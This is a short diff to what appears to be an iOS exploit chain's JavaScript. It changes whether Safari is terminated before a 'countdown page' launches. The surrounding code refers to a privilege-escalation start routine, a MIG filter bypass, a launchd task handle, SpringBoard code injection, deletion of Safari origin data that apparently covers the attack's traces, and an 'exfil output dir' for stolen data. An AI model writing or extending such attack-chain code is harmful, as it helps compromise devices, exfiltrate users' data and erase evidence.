@@ -8477,7 +8477,7 @@ const POWERCUFF_TWEAK_LABEL = "Powercuff";
 const ENABLE_THREEAPP = !!globalThis.__ls_enable_threeapp;
 const ENABLE_SAFARI_ORIGIN_AUDIT = true;
 const ENABLE_SAFARI_ORIGIN_DELETE = true;
-const ENABLE_SAFARI_KILL_AFTER_CLEAN = true;
+const ENABLE_SAFARI_KILL_BEFORE_COUNTDOWN = false;
 // sbcustomizer_light.js dispatches to the SpringBoard main thread
 // asynchronously. When it runs without Powercuff piggybacking on it, keep the
 // chain alive briefly so the dispatched main-thread work has time to run
@@ -9833,10 +9833,12 @@ function start() { LOG("[+] PE start() called");
 
 	LOG("[PE] Status log: " + CHAIN_STATUS_LOG_PATH);
 	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
-	if (ENABLE_SAFARI_KILL_AFTER_CLEAN) {
-		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
+	if (ENABLE_SAFARI_KILL_BEFORE_COUNTDOWN) {
+		runOptionalStage("Safari app termination before countdown", true, () => terminateSafariAfterClean(launchdTask));
+	} else {
+		LOG("[PE] Safari app termination before countdown disabled");
 	}
-	LOG("[PE] Initial Safari reset complete cleanOk=" + safariCleanOk + "; launching countdown page");
+	LOG("[PE] Initial Safari clean complete cleanOk=" + safariCleanOk + "; launching countdown page");
 	launchCountdownPageInSafari(null, migFilterBypass, 0);
 
 	// Create exfil output dir in /private/var/tmp (user-accessible via Filza)
